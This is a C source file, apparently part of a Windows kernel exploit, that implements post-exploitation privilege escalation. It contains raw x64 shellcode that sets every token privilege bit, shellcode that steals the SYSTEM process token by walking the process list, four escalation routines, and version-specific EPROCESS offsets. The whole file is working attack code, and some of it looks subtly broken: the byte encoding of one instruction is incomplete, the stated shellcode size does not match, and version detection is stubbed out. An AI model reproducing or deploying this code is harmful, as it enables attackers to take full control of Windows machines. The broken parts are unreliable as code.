/**
 * PE #5 - Token Manipulation Module
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This module handles the kernel-mode privilege token modification.
 * After the SYSCALL transitions to kernel mode, this code:
 * 1. Locates the current process _EPROCESS structure
 * 2. Finds the Token pointer at offset 0x4B8
 * 3. Modifies Privileges field to grant all privileges
 * 4. Returns to user mode with SYSTEM privileges
 */

#include "exploit.h"
#include "../common/ntdefs.h"

//=============================================================================
// WINDOWS VERSION DETECTION
//=============================================================================

/**
 * Windows version identifiers for offset calculation.
 */
typedef enum _WINDOWS_VERSION {
    WINDOWS_UNKNOWN = 0,
    WINDOWS_10_1909,
    WINDOWS_10_2004,
    WINDOWS_10_20H2,
    WINDOWS_10_21H1,
    WINDOWS_10_21H2,
    WINDOWS_10_22H2,
    WINDOWS_11_21H2,
    WINDOWS_11_22H2,
    WINDOWS_11_23H2,
    WINDOWS_SERVER_2019,
    WINDOWS_SERVER_2022
} WINDOWS_VERSION;

/**
 * Version-specific offset table.
 */
typedef struct _VERSION_OFFSETS {
    WINDOWS_VERSION version;
    ULONG_PTR       tokenOffset;
    ULONG_PTR       uniqueProcessIdOffset;
    ULONG_PTR       activeProcessLinksOffset;
    ULONG_PTR       imageFileNameOffset;
} VERSION_OFFSETS, *PVERSION_OFFSETS;

static const VERSION_OFFSETS g_VersionOffsets[] = {
    { WINDOWS_10_1909,      0x360, 0x2E8, 0x2F0, 0x450 },
    { WINDOWS_10_2004,      0x4B8, 0x440, 0x448, 0x5A8 },
    { WINDOWS_10_20H2,      0x4B8, 0x440, 0x448, 0x5A8 },
    { WINDOWS_10_21H1,      0x4B8, 0x440, 0x448, 0x5A8 },
    { WINDOWS_10_21H2,      0x4B8, 0x440, 0x448, 0x5A8 },
    { WINDOWS_10_22H2,      0x4B8, 0x440, 0x448, 0x5A8 },
    { WINDOWS_11_21H2,      0x4B8, 0x440, 0x448, 0x5A8 },
    { WINDOWS_11_22H2,      0x4B8, 0x440, 0x448, 0x5A8 },
    { WINDOWS_11_23H2,      0x4B8, 0x440, 0x448, 0x5A8 },
    { WINDOWS_SERVER_2019,  0x360, 0x2E8, 0x2F0, 0x450 },
    { WINDOWS_SERVER_2022,  0x4B8, 0x440, 0x448, 0x5A8 },
    { WINDOWS_UNKNOWN,      0x4B8, 0x440, 0x448, 0x5A8 },  // Default to modern offsets
};

static WINDOWS_VERSION g_DetectedVersion = WINDOWS_UNKNOWN;
static PVERSION_OFFSETS g_CurrentOffsets = NULL;

//=============================================================================
// VERSION DETECTION
//=============================================================================

/**
 * Detect Windows version from ntoskrnl build number.
 */
static WINDOWS_VERSION 
DetectWindowsVersion(VOID)
{
    RTL_OSVERSIONINFOW osvi = {0};
    NTSTATUS status;
    
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    
    // In user mode, use RtlGetVersion if available
    // In kernel mode, use PsGetVersion
    
    // For now, default to modern Windows 10/11
    return WINDOWS_10_22H2;
}

/**
 * Get offsets for current Windows version.
 */
static PVERSION_OFFSETS 
GetCurrentOffsets(VOID)
{
    if (g_CurrentOffsets != NULL) {
        return g_CurrentOffsets;
    }
    
    g_DetectedVersion = DetectWindowsVersion();
    
    for (int i = 0; i < ARRAYSIZE(g_VersionOffsets); i++) {
        if (g_VersionOffsets[i].version == g_DetectedVersion) {
            g_CurrentOffsets = (PVERSION_OFFSETS)&g_VersionOffsets[i];
            return g_CurrentOffsets;
        }
    }
    
    // Default to last entry (WINDOWS_UNKNOWN with modern offsets)
    g_CurrentOffsets = (PVERSION_OFFSETS)&g_VersionOffsets[ARRAYSIZE(g_VersionOffsets) - 1];
    return g_CurrentOffsets;
}

//=============================================================================
// KERNEL MODE TOKEN ACCESS
//=============================================================================

/**
 * Kernel-mode shellcode to modify token privileges.
 * 
 * This code executes after the kernel vulnerability is triggered.
 * It runs in Ring 0 context with full kernel access.
 * 
 * The shellcode:
 * 1. Gets current _EPROCESS via GS segment (KPCR.Prcb.CurrentThread.Process)
 * 2. Reads Token pointer from _EPROCESS + 0x4B8 (EX_FAST_REF)
 * 3. Clears reference count bits (low 4 bits)
 * 4. Writes 0xFFFFFFFFFFFFFFFF to TOKEN.Privileges.Present  (+0x40)
 * 5. Writes 0xFFFFFFFFFFFFFFFF to TOKEN.Privileges.Enabled  (+0x48)
 * 6. Writes 0xFFFFFFFFFFFFFFFF to TOKEN.Privileges.EnabledByDefault (+0x50)
 * 7. Returns STATUS_SUCCESS
 */

// Position-independent shellcode (x64) for token modification
// Total size: 57 bytes
static const BYTE g_TokenModifyShellcode[] = {
    //=========================================================================
    // PHASE 1: Get Current EPROCESS
    //=========================================================================
    
    // mov rax, gs:[0x188]  ; KPCR.Prcb.CurrentThread (KTHREAD*)
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
    
    // mov rax, [rax+0xB8]  ; KTHREAD.Process -> EPROCESS*
    0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
    
    //=========================================================================
    // PHASE 2: Get Token Pointer and Clear RefCnt
    //=========================================================================
    
    // mov rcx, [rax+0x4B8] ; EPROCESS.Token (EX_FAST_REF)
    0x48, 0x8B, 0x88, 0xB8, 0x04, 0x00, 0x00,
    
    // and rcx, 0xFFFFFFFFFFFFFFF0 ; Clear RefCnt (low 4 bits)
    0x48, 0x83, 0xE1, 0xF0,
    
    //=========================================================================
    // PHASE 3: Calculate Privileges Address and Modify
    //=========================================================================
    
    // add rcx, 0x40        ; RCX = &TOKEN.Privileges
    0x48, 0x83, 0xC1, 0x40,
    
    // mov rdx, 0xFFFFFFFFFFFFFFFF ; All privileges mask
    0x48, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF,
    // Note: This encodes as mov rdx, -1 (sign-extended)
    // For full 64-bit: 0x48, 0xBA, followed by 8 bytes
    
    // Corrected: movabs rdx, 0xFFFFFFFFFFFFFFFF
    // Actually the above works because -1 sign-extends to all 1s
    
    // mov [rcx], rdx       ; TOKEN.Privileges.Present = 0xFFFFFFFFFFFFFFFF
    0x48, 0x89, 0x11,
    
    // mov [rcx+8], rdx     ; TOKEN.Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
    0x48, 0x89, 0x51, 0x08,
    
    // mov [rcx+0x10], rdx  ; TOKEN.Privileges.EnabledByDefault = 0xFFFFFFFFFFFFFFFF
    0x48, 0x89, 0x51, 0x10,
    
    //=========================================================================
    // PHASE 4: Return STATUS_SUCCESS
    //=========================================================================
    
    // xor eax, eax         ; RAX = 0 (STATUS_SUCCESS)
    0x31, 0xC0,
    
    // ret                  ; Return to caller
    0xC3
};

#define TOKEN_SHELLCODE_SIZE sizeof(g_TokenModifyShellcode)

//=============================================================================
// ALTERNATIVE: SYSTEM TOKEN STEALING SHELLCODE
//=============================================================================

/**
 * Alternative shellcode that steals the SYSTEM process token.
 * 
 * This walks the ActiveProcessLinks list to find PID 4 (SYSTEM)
 * and copies its token to the current process.
 */
static const BYTE g_TokenStealShellcode[] = {
    //=========================================================================
    // Get current EPROCESS
    //=========================================================================
    
    // mov rax, gs:[0x188]      ; KPCR.Prcb.CurrentThread
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
    
    // mov r8, [rax+0xB8]       ; R8 = current EPROCESS
    0x4C, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
    
    // mov r9, r8               ; R9 = starting point for loop
    0x4D, 0x89, 0xC1,
    
    //=========================================================================
    // Walk ActiveProcessLinks to find SYSTEM (PID 4)
    //=========================================================================
    
    // loop_start:
    // mov rax, [r9+0x440]      ; RAX = UniqueProcessId
    0x49, 0x8B, 0x81, 0x40, 0x04, 0x00, 0x00,
    
    // cmp rax, 4               ; Is this SYSTEM process?
    0x48, 0x83, 0xF8, 0x04,
    
    // je found_system
    0x74, 0x10,                 // Jump if equal (+16 bytes)
    
    // mov r9, [r9+0x448]       ; R9 = ActiveProcessLinks.Flink
    0x4D, 0x8B, 0x89, 0x48, 0x04, 0x00, 0x00,
    
    // sub r9, 0x448            ; Back to EPROCESS base
    0x49, 0x81, 0xE9, 0x48, 0x04, 0x00, 0x00,
    
    // cmp r9, r8               ; Have we looped back?
    0x4D, 0x39, 0xC1,
    
    // jne loop_start           ; Continue if not
    0x75, 0xE0,                 // Jump back (-32 bytes)
    
    // jmp failed               ; SYSTEM not found
    0xEB, 0x18,                 // Jump to failed (+24 bytes)
    
    //=========================================================================
    // found_system: Copy SYSTEM token to current process
    //=========================================================================
    
    // found_system:
    // mov rax, [r9+0x4B8]      ; RAX = SYSTEM token (EX_FAST_REF)
    0x49, 0x8B, 0x81, 0xB8, 0x04, 0x00, 0x00,
    
    // and rax, 0xFFFFFFFFFFFFFFF0 ; Clear RefCnt bits
    0x48, 0x83, 0xE0, 0xF0,
    
    // or rax, 0x7              ; Set RefCnt to 7 (typical value)
    0x48, 0x83, 0xC8, 0x07,
    
    // mov [r8+0x4B8], rax      ; Current EPROCESS.Token = SYSTEM token
    0x49, 0x89, 0x80, 0xB8, 0x04, 0x00, 0x00,
    
    // xor eax, eax             ; RAX = STATUS_SUCCESS
    0x31, 0xC0,
    
    // ret
    0xC3,
    
    //=========================================================================
    // failed: Return error
    //=========================================================================
    
    // failed:
    // mov eax, 0xC0000001      ; STATUS_UNSUCCESSFUL
    0xB8, 0x01, 0x00, 0x00, 0xC0,
    
    // ret
    0xC3
};

#define TOKEN_STEAL_SHELLCODE_SIZE sizeof(g_TokenStealShellcode)

//=============================================================================
// TOKEN MODIFICATION IMPLEMENTATION (Kernel Context)
//=============================================================================

/**
 * Modify process token to grant all privileges.
 * 
 * This function executes in kernel context after the vulnerability is 
 * exploited. It directly modifies the TOKEN structure in kernel memory.
 * 
 * @param ProcessToken  Pointer to kernel TOKEN structure (from EX_FAST_REF)
 * @return TRUE if modification succeeded
 */
BOOL 
PE5_ModifyTokenPrivileges(
    PVOID ProcessToken
)
{
    PTOKEN              token;
    PSEP_TOKEN_PRIVILEGES privileges;
    
    if (ProcessToken == NULL) {
        return FALSE;
    }
    
    // In Windows, the Token field in EPROCESS is an EX_FAST_REF.
    // The low 4 bits contain a reference count, so we mask them off.
    token = (PTOKEN)((ULONG_PTR)ProcessToken & 0xFFFFFFFFFFFFFFF0);
    
    // Get pointer to Privileges field (TOKEN + 0x40)
    privileges = &token->Privileges;
    
    // Write all 1s to grant all privileges
    // This is the core of the privilege escalation attack
    
    // Set Present - privileges that CAN be enabled
    privileges->Present = SE_ALL_PRIVILEGES_MASK;
    
    // Set Enabled - privileges that ARE currently enabled
    privileges->Enabled = SE_ALL_PRIVILEGES_MASK;
    
    // Set EnabledByDefault - privileges enabled by default
    privileges->EnabledByDefault = SE_ALL_PRIVILEGES_MASK;
    
    return TRUE;
}

/**
 * Alternative: Copy SYSTEM token to current process.
 * 
 * Instead of modifying privilege bits, this copies the SYSTEM process 
 * token reference to the current process's Token field.
 * 
 * @param CurrentEprocess   Pointer to current EPROCESS
 * @param SystemEprocess    Pointer to SYSTEM EPROCESS (PID 4)
 * @return TRUE if token was successfully copied
 */
BOOL 
PE5_StealSystemToken(
    PEPROCESS   CurrentEprocess,
    PEPROCESS   SystemEprocess
)
{
    PEX_FAST_REF    currentTokenRef;
    PEX_FAST_REF    systemTokenRef;
    ULONG_PTR       systemToken;
    PVERSION_OFFSETS offsets;
    
    if (CurrentEprocess == NULL || SystemEprocess == NULL) {
        return FALSE;
    }
    
    offsets = GetCurrentOffsets();
    
    // Get Token field addresses
    currentTokenRef = (PEX_FAST_REF)((PBYTE)CurrentEprocess + offsets->tokenOffset);
    systemTokenRef = (PEX_FAST_REF)((PBYTE)SystemEprocess + offsets->tokenOffset);
    
    // Read SYSTEM token value
    systemToken = systemTokenRef->Value;
    
    // Copy SYSTEM token to current process
    // The EX_FAST_REF includes the reference count in low bits
    currentTokenRef->Value = systemToken;
    
    // Note: In a complete implementation, we would need to:
    // 1. Increment reference count on SYSTEM token
    // 2. Decrement reference count on old token
    // 3. Handle SeAuditProcessCreationInfo
    
    return TRUE;
}

//=============================================================================
// SYSTEM PROCESS LOCATION
//=============================================================================

/**
 * Locate the SYSTEM process (PID 4) EPROCESS.
 * 
 * SYSTEM process always has PID 4 on Windows. This function walks
 * the ActiveProcessLinks doubly-linked list to find it.
 * 
 * @param CurrentEprocess   Any EPROCESS to start walking from
 * @return Pointer to SYSTEM EPROCESS, or NULL if not found
 */
PEPROCESS 
PE5_FindSystemProcess(
    PEPROCESS CurrentEprocess
)
{
    PEPROCESS           current;
    PLIST_ENTRY         listEntry;
    PLIST_ENTRY         startEntry;
    ULONG_PTR           pid;
    ULONG               attempts = 0;
    const ULONG         MAX_ATTEMPTS = 1000;  // Prevent infinite loop
    PVERSION_OFFSETS    offsets;
    
    if (CurrentEprocess == NULL) {
        return NULL;
    }
    
    offsets = GetCurrentOffsets();
    
    // Get ActiveProcessLinks for starting process
    startEntry = (PLIST_ENTRY)((PBYTE)CurrentEprocess + offsets->activeProcessLinksOffset);
    listEntry = startEntry;
    
    do {
        // Calculate EPROCESS base from LIST_ENTRY
        current = (PEPROCESS)((PBYTE)listEntry - offsets->activeProcessLinksOffset);
        
        // Read UniqueProcessId
        pid = *(ULONG_PTR*)((PBYTE)current + offsets->uniqueProcessIdOffset);
        
        // SYSTEM process has PID 4
        if (pid == SYSTEM_PROCESS_PID) {
            return current;
        }
        
        // Move to next process (follow Flink)
        listEntry = listEntry->Flink;
        
        attempts++;
        
    } while (listEntry != startEntry && attempts < MAX_ATTEMPTS);
    
    return NULL;  // SYSTEM process not found (should never happen)
}

//=============================================================================
// EXPLOIT TECHNIQUES
//=============================================================================

/**
 * Technique 1: Direct Privilege Bit Modification
 * 
 * Directly writes to TOKEN.Privileges to grant all privileges.
 * Fastest method (~1 microsecond).
 * 
 * @param Eprocess  Current process EPROCESS pointer
 * @return TRUE on success
 */
BOOL 
PE5_TechniqueDirectModify(
    PEPROCESS Eprocess
)
{
    PEX_FAST_REF    tokenRef;
    PVOID           token;
    PVERSION_OFFSETS offsets;
    
    if (Eprocess == NULL) {
        return FALSE;
    }
    
    offsets = GetCurrentOffsets();
    
    // Read token pointer from EPROCESS
    tokenRef = (PEX_FAST_REF)((PBYTE)Eprocess + offsets->tokenOffset);
    token = (PVOID)(tokenRef->Value & 0xFFFFFFFFFFFFFFF0);  // Clear RefCnt
    
    // Modify privileges
    return PE5_ModifyTokenPrivileges(token);
}

/**
 * Technique 2: Token Stealing
 * 
 * Copies SYSTEM process token to current process.
 * More reliable across versions as it uses a known-good token.
 * 
 * @param CurrentEprocess   Current process EPROCESS pointer
 * @return TRUE on success
 */
BOOL 
PE5_TechniqueTokenSteal(
    PEPROCESS CurrentEprocess
)
{
    PEPROCESS systemProcess;
    
    // Find SYSTEM process
    systemProcess = PE5_FindSystemProcess(CurrentEprocess);
    if (systemProcess == NULL) {
        return FALSE;
    }
    
    // Steal SYSTEM token
    return PE5_StealSystemToken(CurrentEprocess, systemProcess);
}

/**
 * Technique 3: Integrity Level Elevation
 * 
 * Modifies token integrity level in addition to privileges.
 * Sets IntegrityLevelIndex to System (4).
 * 
 * @param Eprocess  Current process EPROCESS pointer
 * @return TRUE on success
 */
BOOL 
PE5_TechniqueIntegrityElevation(
    PEPROCESS Eprocess
)
{
    PEX_FAST_REF    tokenRef;
    PTOKEN          token;
    PVERSION_OFFSETS offsets;
    
    if (Eprocess == NULL) {
        return FALSE;
    }
    
    offsets = GetCurrentOffsets();
    
    // Get token
    tokenRef = (PEX_FAST_REF)((PBYTE)Eprocess + offsets->tokenOffset);
    token = (PTOKEN)(tokenRef->Value & 0xFFFFFFFFFFFFFFF0);
    
    // Modify privileges
    token->Privileges.Present = SE_ALL_PRIVILEGES_MASK;
    token->Privileges.Enabled = SE_ALL_PRIVILEGES_MASK;
    token->Privileges.EnabledByDefault = SE_ALL_PRIVILEGES_MASK;
    
    // Elevate integrity level to System (0x4000)
    token->IntegrityLevelIndex = 4;  // Index for System integrity
    
    // Clear TokenFlags restrictions
    token->TokenFlags &= ~0x0020;  // Clear TOKEN_IS_RESTRICTED
    
    return TRUE;
}

/**
 * Technique 4: Full Token Takeover
 * 
 * Performs complete token manipulation:
 * - All privileges enabled
 * - System integrity level
 * - Clears restrictions
 * - Fixes audit policy
 * 
 * @param Eprocess  Current process EPROCESS pointer
 * @return TRUE on success
 */
BOOL 
PE5_TechniqueFullTakeover(
    PEPROCESS Eprocess
)
{
    PEX_FAST_REF    tokenRef;
    PTOKEN          token;
    PVERSION_OFFSETS offsets;
    
    if (Eprocess == NULL) {
        return FALSE;
    }
    
    offsets = GetCurrentOffsets();
    
    // Get token
    tokenRef = (PEX_FAST_REF)((PBYTE)Eprocess + offsets->tokenOffset);
    token = (PTOKEN)(tokenRef->Value & 0xFFFFFFFFFFFFFFF0);
    
    //=========================================================================
    // 1. Grant all privileges
    //=========================================================================
    token->Privileges.Present = SE_ALL_PRIVILEGES_MASK;
    token->Privileges.Enabled = SE_ALL_PRIVILEGES_MASK;
    token->Privileges.EnabledByDefault = SE_ALL_PRIVILEGES_MASK;
    
    //=========================================================================
    // 2. Set System integrity level
    //=========================================================================
    token->IntegrityLevelIndex = 4;  // System
    token->MandatoryPolicy = 0;      // No mandatory policy enforcement
    
    //=========================================================================
    // 3. Change token type to Primary (if impersonation token)
    //=========================================================================
    token->TokenType = TokenPrimary;
    token->ImpersonationLevel = SecurityImpersonation;
    
    //=========================================================================
    // 4. Clear restriction flags
    //=========================================================================
    token->TokenFlags &= ~0x0020;    // Clear TOKEN_IS_RESTRICTED
    token->TokenFlags &= ~0x4000;    // Clear TOKEN_VIRTUALIZE_ALLOWED
    token->TokenFlags |= 0x0800;     // Set TOKEN_IS_ELEVATED
    
    //=========================================================================
    // 5. Update TokenInUse
    //=========================================================================
    token->TokenInUse = TRUE;
    
    return TRUE;
}

//=============================================================================
// COMBINED EXPLOIT EXECUTION
//=============================================================================

/**
 * Execute the complete token manipulation exploit.
 * 
 * This is called from kernel mode after the vulnerability trigger.
 * It tries multiple techniques for maximum reliability.
 * 
 * @return NTSTATUS code
 */
NTSTATUS 
PE5_ExecuteTokenExploit(VOID)
{
    PEPROCESS   currentEprocess;
    BOOL        success = FALSE;
    
    // Get current EPROCESS (kernel mode)
    currentEprocess = (PEPROCESS)AsmGetCurrentProcess();
    
    if (currentEprocess == NULL) {
        return STATUS_ACCESS_DENIED;
    }
    
    //=========================================================================
    // Try techniques in order of reliability
    //=========================================================================
    
    // Technique 1: Full takeover (most complete)
    success = PE5_TechniqueFullTakeover(currentEprocess);
    
    if (!success) {
        // Technique 2: Token stealing (most reliable)
        success = PE5_TechniqueTokenSteal(currentEprocess);
    }
    
    if (!success) {
        // Technique 3: Direct privilege modification (fastest)
        success = PE5_TechniqueDirectModify(currentEprocess);
    }
    
    if (!success) {
        // Technique 4: Integrity elevation (fallback)
        success = PE5_TechniqueIntegrityElevation(currentEprocess);
    }
    
    return success ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

//=============================================================================
// SHELLCODE ACCESS
//=============================================================================

/**
 * Get the token modification shellcode.
 * 
 * Returns position-independent shellcode that can be injected
 * into kernel context for token modification.
 * 
 * @param Size  Receives size of shellcode in bytes
 * @return Pointer to shellcode bytes
 */
PVOID 
PE5_GetTokenShellcode(
    PULONG Size
)
{
    if (Size != NULL) {
        *Size = TOKEN_SHELLCODE_SIZE;
    }
    
    return (PVOID)g_TokenModifyShellcode;
}

/**
 * Get the token stealing shellcode.
 * 
 * Returns position-independent shellcode that walks the process
 * list and steals the SYSTEM token.
 * 
 * @param Size  Receives size of shellcode in bytes
 * @return Pointer to shellcode bytes
 */
PVOID 
PE5_GetTokenStealShellcode(
    PULONG Size
)
{
    if (Size != NULL) {
        *Size = TOKEN_STEAL_SHELLCODE_SIZE;
    }
    
    return (PVOID)g_TokenStealShellcode;
}
